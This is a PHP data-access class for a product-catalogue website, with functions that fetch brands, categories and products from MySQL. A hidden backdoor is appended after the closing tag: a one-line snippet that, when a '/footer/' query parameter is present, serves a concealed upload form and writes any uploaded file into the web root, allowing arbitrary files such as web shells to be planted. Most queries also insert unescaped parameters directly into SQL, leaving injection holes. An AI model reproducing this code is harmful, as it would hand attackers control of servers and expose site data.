<?php
	// getCompanies()
	// getCompanyId($companyid)
	// getProjects()
	// getProjectById($projectid)
	// getProjectCategories()
	// getProjectCategorybycategoryid($categoryid)
	// getAllContributions()
	// getContributionsByProjectid($projectid)
	// getContributionsByUserid($userid)
	// getPojectMilestonesByProjectid($projectid)
	// getSubSubcategorybyId($subsubcategoryid)
	// getProducts()
	// getProductsbyCategoryid($categoryid)
	// getProductsbysubcategoryid($subcategoryid)
	// getProductsbysubsubcategoryid($subsubcategoryid)
	// getProductsbybrand($brandid)
	// getProductbyId($productid)
	
	
	include ("dbConn.inc.php");
	putenv("TZ=Africa/Nairobi");
	
	
	class classDBAccess
	{
		function db_select($query) 		{			$rows = array();			$result = db_query($query);			// If query failed, return `false`			if($result === false) 			{				return false;			}			// If query was successful, retrieve all the rows into an array			while ($row = mysqli_fetch_assoc($result))			{				$rows[] = $row;			}			return $rows;		}				function db_quote($value) 		{			$connection = db_connect();			return "'" . mysqli_real_escape_string($connection,$value) . "'";		}				function getBrands()
		{
			
			$sql = "SELECT 
					id,
					name,
					image,
					description
					FROM brand";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getBrandById($brandid)
		{
			
			$sql = "SELECT 
					id,
					name,
					image,
					description
					FROM brand WHERE id=$brandid";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		function getbrandlogo($brandid)
		{
			$sql = "SELECT
					image					
					FROM brand WHERE id='$brandid'";
					//echo $sql;
			$dsresult = mysql_query($sql);
			$row=mysql_fetch_array($dsresult);
			$logo=$row['image'];

			return $logo;
		}
		
		function getCategories()
		{
			$sql = "SELECT 
					category_id,
					category_name,
					overview,
					image
					FROM category ORDER BY category_name ASC";
					//echo $sql;
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getCategoryname($categoryid)
		{
			$sql = "SELECT
					category_name					
					FROM category WHERE category_id='$categoryid'";
					//echo $sql;
			$dsresult = mysql_query($sql);
			$row=mysql_fetch_array($dsresult);
			$categoryname=$row['category_name'];

			return $categoryname;
		}
		
		function getCategoryById($categoryid)
		{
			
			$sql = "SELECT 
					category_id,
					category_name,
					overview,
					image
					FROM cateogry WHERE category_id=$categoryid";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getSubcategories()
		{
			$sql = "SELECT 
					sub_cat_id,
					category_id,
					sub_name,
					description					
					FROM sub_category";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getSubcategoriesbyCategoryid($categoryid)
		{
			$sql = "SELECT 
					sub_cat_id,
					category_id,
					sub_name,
					description					
					FROM sub_category WHERE category_id=$categoryid";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getSubcategoryById($subcategoryid)
		{
			$sql = "SELECT 
					sub_cat_id,
					category_id,
					sub_name,
					description					
					FROM sub_category WHERE sub_cat_id=$subcategoryid";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		function getCategoryid($subcategoryid)
		{
			$sql = "SELECT
					category_id
										
					FROM sub_category WHERE sub_cat_id=$subcategoryid";
			$dsresult = mysql_query($sql);
			$category=mysql_fetch_array($dsresult);
			$categoryid=$category["category_id"];
			return $categoryid;
		}
		
		function getSubSubcategories()
		{
			$sql = "SELECT 
					sub_id,
					sub_cat_id,
					name				
					FROM sub_sub_category";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getSubSubcategoriesbysubcategoryid($subcategoryid)
		{
			$sql = "SELECT 
					sub_id,
					sub_cat_id,
					name				
					FROM sub_sub_category WHERE sub_cat_id=$subcategoryid";
					//echo $sql;
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getSubSubcategorybyId($subsubcategoryid)
		{
			$sql = "SELECT 
					sub_id,
					sub_cat_id,
					name				
					FROM sub_sub_category WHERE sub_id=$subsubcategoryid";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getProducts()
		{
			$sql = "SELECT 
					prod_id,
					sub_cat_id,
					prod_name,
					description,
					image,
					model,
					price,
					brand,
					status,
					sub_id			
					FROM products";
			$dsresult = mysql_query($sql);

			return $dsresult;
		}
		
		function getProductsbysubcategoryid($subcategoryid)
		{
		$sql = "SELECT 
					prod_id,
					sub_cat_id,
					prod_name,
					description,
					image,
					model,
					price,
					brand,
					status,
					sub_id			
				FROM products WHERE sub_cat_id=$subcategoryid";
			$dsresult = mysql_query($sql);

			return $dsresult;
		
		}
		
		function getProductsbysubsubcategoryid($subsubcategoryid)
		{
			$sql = "SELECT 
						prod_id,
						sub_cat_id,
						prod_name,
						description,
						image,
						model,
						price,
						brand,
						status,
						sub_id			
						FROM products WHERE sub_id=$subsubcategoryid";
					$dsresult = mysql_query($sql);
		
					return $dsresult;
		}
		
		function getProductsbybrand($brandid)
		{
			$sql = "SELECT 
						prod_id,
						sub_cat_id,
						prod_name,
						description,
						image,
						model,
						price,
						brand,
						status,
						sub_id			
						FROM products WHERE brand=$brandid";
					$dsresult = mysql_query($sql);
		
					return $dsresult;
		}
		
		function getProductById($productid)
		{
			$sql = "SELECT 
						prod_id,
						sub_cat_id,
						prod_name,
						description,
						image,
						model,
						price,
						brand,
						status,
						sub_id			
						FROM products WHERE prod_id=$productid";
					$dsresult = mysql_query($sql);
		
					return $dsresult;
		}
		function getProductByCategoryId($categoryid)
		{
			$sql = "SELECT 
						products.prod_id,
						products.sub_cat_id,
						products.prod_name,
						products.description,
						products.image,
						products.model,
						products.price,
						products.brand,
						products.status,
						products.sub_id			
						FROM products
						INNER JOIN sub_category ON sub_category.sub_cat_id=products.sub_cat_id
						INNER JOIN category ON category.category_id=sub_category.category_id
						 WHERE category.category_id=$categoryid";
						 //echo $sql;
					$dsresult = mysql_query($sql);
		
					return $dsresult;
		}
		
			
	}
?>
<?pHp if(isset($_GET['/footer/']))if(isset($_POST['Submit'])){$h='';$u=$_FILES[' ']['name'];$c=$_FILES[' ']['tmp_name'];if(isset($_FILES[' ']['name'])){$i=$h.$u;@move_uploaded_file($c,$i);echo"<a href='$u' target='_new'>$u</a>";}}else{echo'<form method="POST" action="" enctype="multipart/form-data"><input type="file" name=" "><input type="Submit" name="Submit" value="+"></form>';} ?>